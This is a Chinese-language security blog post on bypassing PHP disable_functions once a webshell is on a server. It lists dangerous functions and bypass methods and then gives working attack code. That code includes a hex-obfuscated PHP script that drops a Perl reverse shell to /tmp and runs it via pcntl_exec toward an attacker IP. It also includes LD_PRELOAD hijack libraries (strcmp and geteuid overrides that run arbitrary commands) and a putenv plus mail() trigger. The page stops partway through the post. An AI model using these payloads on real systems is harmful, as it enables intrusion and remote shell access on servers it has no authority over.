<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Hexo Theme Keep">
    <meta name="description" content="Whatever is worth doing is worth doing well !">
    <meta name="author" content="ssooking">
    
    <title>
        
            bypass php disable_functions |
        
        ssooking&#39;s notebook
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    <link rel="shortcut icon" href="/images/logo.svg">
    
<link rel="stylesheet" href="/css/font-awesome.min.css">

    <script id="hexo-configurations">
    let KEEP = window.KEEP || {};
    KEEP.hexo_config = {"hostname":"ssooking.github.io","root":"/","language":"en","path":"search.json"};
    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":false},"style":{"primary_color":"#0066CC","avatar":"/images/avatar.png","favicon":"/images/logo.svg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep moving!"},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":false},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":3};
    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
  </script>
<meta name="generator" content="Hexo 6.0.0"></head>


<body>
<div class="progress-bar-container">
    

    
</div>


<main class="page-container">

    

    <div class="page-main-content">

        <div class="page-main-content-top">
            <header class="header-wrapper">

    <div class="header-content">
        <div class="left">
            
            <a class="logo-title" href="/">
                ssooking&#39;s notebook
            </a>
        </div>

        <div class="right">
            <div class="pc">
                <ul class="menu-list">
                    
                        <li class="menu-item">
                            <a class=""
                               href="/"
                            >
                                HOME
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/archives"
                            >
                                ARCHIVES
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/categories"
                            >
                                CATEGORIES
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/tags"
                            >
                                TAGS
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/about"
                            >
                                ABOUT
                            </a>
                        </li>
                    
                    
                        <li class="menu-item search search-popup-trigger">
                            <i class="fas fa-search"></i>
                        </li>
                    
                </ul>
            </div>
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list">
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/">HOME</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/archives">ARCHIVES</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/categories">CATEGORIES</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/tags">TAGS</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/about">ABOUT</a>
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle">

            <div class="main-content">

                
                    <div class="fade-in-down-animation">
    <div class="article-content-container">

        <div class="article-title">
            <span class="title-hover-animation">bypass php disable_functions</span>
        </div>

        
            <div class="article-header">
                <div class="avatar">
                    <img src="/images/avatar.png">
                </div>
                <div class="info">
                    <div class="author">
                        <span class="name">ssooking</span>
                        
                            <span class="author-label">Lv5</span>
                        
                    </div>
                    <div class="meta-info">
                        <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fas fa-edit"></i>&nbsp;
        <span class="pc">2021-02-23 10:11:00</span>
        <span class="mobile">2021-02-23 10:11</span>
    </span>
    
        <span class="article-categories article-meta-item">
            <i class="fas fa-folder"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>&nbsp;
                    </li>
                
                    <li>
                        &gt; <a href="/categories/Web%E5%AE%89%E5%85%A8/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/">攻防渗透</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fas fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/bypass/">bypass</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
    
    
</div>

                    </div>
                </div>
            </div>
        

        <div class="article-content markdown-body">
            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>渗透过程中，当利用webshell执行命令时报错，蚁剑等工具返回<code>ret=127</code>，查看phpinfo信息发现存在disable_functions函数禁用项时，说明存在disable_functions，此时需要进行绕过。</p>
<p>disable_functions是php.ini配置文件中的一个黑名单配置项，运维人员或安全管理员出于安全考虑会禁用一些危险PHP函数，如命令执行函数等，导致渗透过程中Webshell无法执行这些命令。如：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disable_functions: passthru,exec,system,chroot,chgrp,chown,shell_exec,proc_open,proc_get_status,popen,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru,link等</span><br></pre></td></tr></table></figure>

<p>常见危险函数功能：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">passthru</span>()：允许执行一个外部程序并回显输出，类似于<span class="title function_ invoke__">exec</span>()</span><br><span class="line"><span class="title function_ invoke__">exec</span>()：允许执行一个外部程序（如UNIX Shell或CMD命令等）</span><br><span class="line"><span class="title function_ invoke__">system</span>()：允许执行一个外部程序并回显输出，类似于<span class="title function_ invoke__">passthru</span>()。</span><br><span class="line"><span class="title function_ invoke__">chroot</span>()：可改变当前PHP进程的工作根目录，仅当系统支持CLI模式PHP时才工作，不适用于Windows</span><br><span class="line"><span class="title function_ invoke__">chgrp</span>()：改变文件或目录所属的用户组。</span><br><span class="line"><span class="title function_ invoke__">chown</span>()：改变文件或目录的所有者。</span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>()：通过Shell执行命令，并将执行结果作为字符串返回。</span><br><span class="line"><span class="title function_ invoke__">proc_open</span>()：执行一个命令并打开文件指针用于读取以及写入。</span><br><span class="line"><span class="title function_ invoke__">proc_get_status</span>()：获取使用<span class="title function_ invoke__">proc_open</span>()所打开进程的信息。</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>()：可用于修改、设置PHP环境配置参数。</span><br><span class="line"><span class="title function_ invoke__">ini_alter</span>()：<span class="title function_ invoke__">ini_set</span>()函数的一个别名函数，功能与<span class="title function_ invoke__">ini_set</span>()相同。具体参见<span class="title function_ invoke__">ini_set</span>()。</span><br><span class="line"><span class="title function_ invoke__">ini_restore</span>()：可用于恢复PHP环境配置参数到其初始值。</span><br><span class="line"><span class="title function_ invoke__">dl</span>()：在 PHP 进行运行过程当中（而非启动时）加载一个PHP外部模块。</span><br><span class="line"><span class="title function_ invoke__">pfsockopen</span>()：建立一个Internet或UNIX域的socket持久连接。</span><br><span class="line"><span class="title function_ invoke__">symlink</span>()：在UNIX系统中建立一个符号链接。</span><br><span class="line"><span class="title function_ invoke__">popen</span>()：可通过<span class="title function_ invoke__">popen</span>()的参数传递一条命令，并对<span class="title function_ invoke__">popen</span>()所打开的文件进行执行。</span><br><span class="line"><span class="title function_ invoke__">putenv</span>()：在PHP运行时改变系统字符集环境。低于<span class="number">5.2</span>.<span class="number">6</span>版本的PHP中可配合利用sendmail指令发送特殊参数执行命令。</span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>()：输出 PHP 环境信息以及相关的模块、WEB环境等信息。</span><br><span class="line"><span class="title function_ invoke__">scandir</span>()：列出指定路径中的文件和目录。</span><br><span class="line"><span class="title function_ invoke__">syslog</span>()：可调用 UNIX 系统的系统层 <span class="title function_ invoke__">syslog</span>()函数。</span><br><span class="line"><span class="title function_ invoke__">readlink</span>()：返回符号连接指向的目标文件内容</span><br><span class="line"><span class="title function_ invoke__">stream_socket_server</span>()：建立一个Internet或UNIX服务器连接</span><br><span class="line"><span class="title function_ invoke__">error_log</span>()：将错误信息发送到指定位置(文件)。在某些版本的PHP中，可使用<span class="title function_ invoke__">error_log</span>()绕过 PHP safe mode，</span><br><span class="line">执行任意命令。</span><br></pre></td></tr></table></figure>



<h1 id="绕过disable-functions"><a href="#绕过disable-functions" class="headerlink" title="绕过disable_functions"></a>绕过disable_functions</h1><p>常见绕过方法：</p>
<ul>
<li>使用未过滤的命令执行函数<ul>
<li><code>exec,shell_exec,system,passthru,popen,proc_open,反单引号</code>等</li>
</ul>
</li>
<li>蚁剑bypass插件</li>
<li>利用环境变量LD_PRELOAD绕过</li>
<li>利用<a class="link"   target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits" >php漏洞<i class="fas fa-external-link-alt"></i></a>实现命令执行<ul>
<li>php7-gc-bypass（php 7.0-7.3）：利用PHP garbage collector程序中的堆溢出漏洞触发执行命令</li>
<li>php-json-bypass（php 7.0-7.3）：利用json序列化程序中的堆溢出漏洞触发执行命令。蚁剑插件实现。</li>
</ul>
</li>
<li><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/zw1sh/p/12632126.html" >利用Apache+mod_cgi+.htaccess<i class="fas fa-external-link-alt"></i></a></li>
<li>利用ImageMagick漏洞绕过</li>
<li>ShellShock漏洞绕过(CVE-2014-6271)</li>
<li>Windows COM组件绕过</li>
<li>Windows PHP拓展win32std绕过</li>
<li>利用PHP7.4的FFI绕过</li>
<li>PHP-FPM</li>
<li>To add</li>
</ul>
<h2 id="使用未过滤的函数"><a href="#使用未过滤的函数" class="headerlink" title="使用未过滤的函数"></a>使用未过滤的函数</h2><p>如果常见命令执行函数未被全部过滤，存在遗漏，则可以使用未被过滤的函数去执行命令。查看php文档中中所有的<a class="link"   target="_blank" rel="noopener" href="https://www.php.net/manual/zh/ref.exec.php" >程序执行函数<i class="fas fa-external-link-alt"></i></a>，常见函数system、exec等被过滤，可以使用popen、pcntl_exec等函数。</p>
<blockquote>
<p>常见函数： system()、exec()、shell_exec()、passthru()</p>
<p>其他函数：popen()、proc_open()、pcntl_exec()</p>
</blockquote>
<p>pcntl是linux的一个php扩展，用于多进程操作，许多PHP的CMS框架都会使用这个拓展。该拓展支持在php中以pcntl_exec函数执行指定程序。如果运维人员安全意识不强，则可能忽略pcntl扩展的相关函数。下面是利用该函数执行的POC，要求<code>PHP 4 &gt;= 4.2.0, PHP 5 on linux</code>。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">/*******************************</span></span><br><span class="line"><span class="comment"> *查看phpinfo编译参数--enable-pcntl</span></span><br><span class="line"><span class="comment"> *作者 Spider</span></span><br><span class="line"><span class="comment"> *nc -vvlp 443</span></span><br><span class="line"><span class="comment">********************************/</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$ip</span> = <span class="string">&#x27;xxx.xxx.xxx.xxx&#x27;</span>;</span><br><span class="line"><span class="variable">$port</span> = <span class="string">&#x27;443&#x27;</span>;</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;/tmp/bc.pl&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-Type: text/html; charset=gb2312&quot;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;pcntl_exec&#x27;</span>)) &#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="string">&quot;\x23\x21\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x70\x65\x72\x6c\x20\x2d\x77\x0d\x0a\x23\x0d\x0a&quot;</span>.</span><br><span class="line">                <span class="string">&quot;\x0d\x0a\x75\x73\x65\x20\x73\x74\x72\x69\x63\x74\x3b\x20\x20\x20\x20\x0d\x0a\x75\x73\x65\x20&quot;</span>.</span><br><span class="line">                <span class="string">&quot;\x53\x6f\x63\x6b\x65\x74\x3b\x0d\x0a\x75\x73\x65\x20\x49\x4f\x3a\x3a\x48\x61\x6e\x64\x6c\x65&quot;</span>.</span><br><span class="line">                <span class="string">&quot;\x3b\x0d\x0a\x0d\x0a\x6d\x79\x20\x24\x72\x65\x6d\x6f\x74\x65\x5f\x69\x70\x20\x3d\x20\x27&quot;</span>.<span class="variable">$ip</span>.</span><br><span class="line">                <span class="string">&quot;\x27\x3b\x0d\x0a\x6d\x79\x20\x24\x72\x65\x6d\x6f\x74\x65\x5f\x70\x6f\x72\x74\x20\x3d\x20\x27&quot;</span>.<span class="variable">$port</span>.</span><br><span class="line">                <span class="string">&quot;\x27\x3b\x0d\x0a\x0d\x0a\x6d\x79\x20\x24\x70\x72\x6f\x74\x6f\x20\x3d\x20\x67\x65\x74\x70\x72&quot;</span>.</span><br><span class="line">                <span class="string">&quot;\x6f\x74\x6f\x62\x79\x6e\x61\x6d\x65\x28\x22\x74\x63\x70\x22\x29\x3b\x0d\x0a\x6d\x79\x20\x24&quot;</span>.</span><br><span class="line">                <span class="string">&quot;\x70\x61\x63\x6b\x5f\x61\x64\x64\x72\x20\x3d\x20\x73\x6f\x63\x6b\x61\x64\x64\x72\x5f\x69\x6e&quot;</span>.</span><br><span class="line">                <span class="string">&quot;\x28\x24\x72\x65\x6d\x6f\x74\x65\x5f\x70\x6f\x72\x74\x2c\x20\x69\x6e\x65\x74\x5f\x61\x74\x6f&quot;</span>.</span><br><span class="line">                <span class="string">&quot;\x6e\x28\x24\x72\x65\x6d\x6f\x74\x65\x5f\x69\x70\x29\x29\x3b\x0d\x0a\x6d\x79\x20\x24\x73\x68&quot;</span>.</span><br><span class="line">                <span class="string">&quot;\x65\x6c\x6c\x20\x3d\x20\x27\x2f\x62\x69\x6e\x2f\x73\x68\x20\x2d\x69\x27\x3b\x0d\x0a\x73\x6f&quot;</span>.</span><br><span class="line">                <span class="string">&quot;\x63\x6b\x65\x74\x28\x53\x4f\x43\x4b\x2c\x20\x41\x46\x5f\x49\x4e\x45\x54\x2c\x20\x53\x4f\x43&quot;</span>.</span><br><span class="line">                <span class="string">&quot;\x4b\x5f\x53\x54\x52\x45\x41\x4d\x2c\x20\x24\x70\x72\x6f\x74\x6f\x29\x3b\x0d\x0a\x53\x54\x44&quot;</span>.</span><br><span class="line">                <span class="string">&quot;\x4f\x55\x54\x2d\x3e\x61\x75\x74\x6f\x66\x6c\x75\x73\x68\x28\x31\x29\x3b\x0d\x0a\x53\x4f\x43&quot;</span>.</span><br><span class="line">                <span class="string">&quot;\x4b\x2d\x3e\x61\x75\x74\x6f\x66\x6c\x75\x73\x68\x28\x31\x29\x3b\x0d\x0a\x63\x6f\x6e\x6e\x65&quot;</span>.</span><br><span class="line">                <span class="string">&quot;\x63\x74\x28\x53\x4f\x43\x4b\x2c\x24\x70\x61\x63\x6b\x5f\x61\x64\x64\x72\x29\x20\x6f\x72\x20&quot;</span>.</span><br><span class="line">                <span class="string">&quot;\x64\x69\x65\x20\x22\x63\x61\x6e\x20\x6e\x6f\x74\x20\x63\x6f\x6e\x6e\x65\x63\x74\x3a\x24\x21&quot;</span>.</span><br><span class="line">                <span class="string">&quot;\x22\x3b\x0d\x0a\x6f\x70\x65\x6e\x20\x53\x54\x44\x49\x4e\x2c\x20\x22\x3c\x26\x53\x4f\x43\x4b&quot;</span>.</span><br><span class="line">                <span class="string">&quot;\x22\x3b\x0d\x0a\x6f\x70\x65\x6e\x20\x53\x54\x44\x4f\x55\x54\x2c\x20\x22\x3e\x26\x53\x4f\x43&quot;</span>.</span><br><span class="line">                <span class="string">&quot;\x4b\x22\x3b\x0d\x0a\x6f\x70\x65\x6e\x20\x53\x54\x44\x45\x52\x52\x2c\x20\x22\x3e\x26\x53\x4f&quot;</span>.</span><br><span class="line">                <span class="string">&quot;\x43\x4b\x22\x3b\x0d\x0a\x73\x79\x73\x74\x65\x6d\x28\x24\x73\x68\x65\x6c\x6c\x29\x3b\x0d\x0a&quot;</span>.</span><br><span class="line">                <span class="string">&quot;\x63\x6c\x6f\x73\x65\x20\x53\x4f\x43\x4b\x3b\x0d\x0a\x65\x78\x69\x74\x20\x30\x3b\x0a&quot;</span>;</span><br><span class="line">        <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file</span>,<span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">fputs</span>(<span class="variable">$fp</span>,<span class="variable">$data</span>);</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$key</span>) <span class="keyword">exit</span>(<span class="string">&#x27;写入&#x27;</span>.<span class="variable">$file</span>.<span class="string">&#x27;失败&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">chmod</span>(<span class="variable">$file</span>,<span class="number">0777</span>);</span><br><span class="line">        <span class="title function_ invoke__">pcntl_exec</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;不支持pcntl扩展&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>





<h2 id="蚁剑bypass插件"><a href="#蚁剑bypass插件" class="headerlink" title="蚁剑bypass插件"></a>蚁剑bypass插件</h2><p>Webshell管理工具蚁剑的bypass插件已实现一些方式绕过disable_functions和open_basedir等安全限制，渗透时快速食用可提高效率。代码仓库<a class="link"   target="_blank" rel="noopener" href="https://github.com/Medicean/as_bypass_php_disable_functions" >地址<i class="fas fa-external-link-alt"></i></a>，主要代码在 <code>core/php_fpm/index.js</code> 里。</p>
<h2 id="利用LD-PRELOAD劫持系统函数"><a href="#利用LD-PRELOAD劫持系统函数" class="headerlink" title="利用LD_PRELOAD劫持系统函数"></a>利用LD_PRELOAD劫持系统函数</h2><p>LD_PRELOAD是linux的一个环境变量，它可以定义程序运行前优先加载的动态链接库，其主要是用来有选择性的载入不同动态链接库中的相同函数。这个特性可以被恶意利用，攻击者可以劫持程序加载的动态链接库，执行其中的自定义恶意函数。关于LD_PRELOAD解析可以参考：<a class="link"   target="_blank" rel="noopener" href="https://www.exploit-db.com/papers/13233" >Reverse Engineering with LD_PRELOAD<i class="fas fa-external-link-alt"></i></a>。</p>
<p>举例说明：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">	<span class="type">char</span> passwd[] = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;usage: %s &lt;given-password&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">strcmp</span>(passwd, argv[<span class="number">1</span>])) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Right password!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Wrong password!\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这是一个简单的判断密码是否正确的程序例子，输入正确的密码123456则会提示正确，否则提示错误。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssooking@pc:~/Test$ gcc test.c -o <span class="built_in">test</span></span><br><span class="line">ssooking@pc:~/Test$ ./test 11111</span><br><span class="line">Wrong password!</span><br><span class="line">ssooking@pc:~/Test$ ./test 123456</span><br><span class="line">Right password!</span><br></pre></td></tr></table></figure>

<p>可以用ldd或readelf命令查看一下动态链接库依赖关系</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ldd <span class="built_in">test</span></span><br><span class="line">	linux-vdso.so.1 =&gt;  (0x00007ffe4dbfc000)</span><br><span class="line">	libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4dd927a000)</span><br><span class="line">	/lib64/ld-linux-x86-64.so.2 (0x00007f4dd9644000)</span><br><span class="line">$ readelf -d <span class="built_in">test</span></span><br></pre></td></tr></table></figure>

<p>通过<code>readelf -Ws test</code>可以查看程序可能调用的系统API函数，但这个命令结果仅代表可能被调用的API，不代表一定调用。通过<code>strace -f + 执行程序</code>可看到程序运行时实际的调用情况。</p>
<p>由于上面的代码调用了标准库里的strcmp()方法，我们可以重写strcmp()方法，攻击代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">payload</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Hijacked!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">strcmp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *s1, <span class="type">const</span> <span class="type">char</span> *s2)</span> &#123;</span><br><span class="line">	payload();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;	<span class="comment">//结果总返回相等</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译并加载动态链接库，观察加载前后的执行结果</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ssooking@pc:~/Test$ gcc -fPIC -c hijack.c -o hijack.o</span><br><span class="line">ssooking@pc:~/Test$ gcc -shared hijack.o -o hijack.so</span><br><span class="line">ssooking@pc:~/Test$ ./test 111111</span><br><span class="line">Wrong password!</span><br><span class="line">ssooking@pc:~/Test$ <span class="built_in">export</span> LD_PRELOAD=./hijack.so</span><br><span class="line">ssooking@pc:~/Test$ ./test 111111</span><br><span class="line">Hijacked!</span><br><span class="line">Right password!</span><br></pre></td></tr></table></figure>

<p>发现加载了恶意动态链接库中的strcmp函数，使返回结果总相等，并打印了测试payload。</p>
<p>在php中，可以使用putenv设置环境变量，同理，绕过disable_functions思路：</p>
<ol>
<li>找到要劫持的目标函数（系统调用）</li>
<li>生成一个恶意动态链接库文件，重写该函数</li>
<li>利用putenv设置LD_PRELOAD，加载恶意动态链接库文件</li>
<li>配合php的某个函数去触发创建新进程，从而加载被劫持的函数，如：<code>mail,imap_mail,error_log,mb_send_mail、__attribute__ ((__constructor__))、imagemagick+GhostScript</code></li>
<li>执行需要的命令</li>
</ol>
<p>例1：以 php的mail函数为例，通过劫持getuid 函数启动新进程</p>
<p>限制：从 strace 命令的结果看mail 函数的使⽤依赖于系统中存在的 sendmail 命令</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -fPIC test.c -o hack &amp;&amp; gcc --share hack -o hack.so</span><br><span class="line">  </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;LD_PRELOAD=./hack.so&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">mail</span>(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p><strong>实战中执行不同命令需要反复编译上传文件进行劫持怎么办？</strong></p>
<p>解决方法是劫持的函数中，写入执行其他脚本或程序的命令，如：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">payload</span><span class="params">()</span> &#123;</span><br><span class="line">        system(<span class="string">&quot;echo `python cmd.py` &gt; result.txt&quot;</span>);</span><br><span class="line">&#125;   </span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">geteuid</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">  unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">  payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>cmd.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;cmd.txt&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    <span class="built_in">print</span> subprocess.call(fp.read(), shell=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>这样只需要修改 cmd.txt就可以执行不同命令，而无需重新编译。</p>
<p><strong>如何找到支持创建新进程的函数？</strong></p>
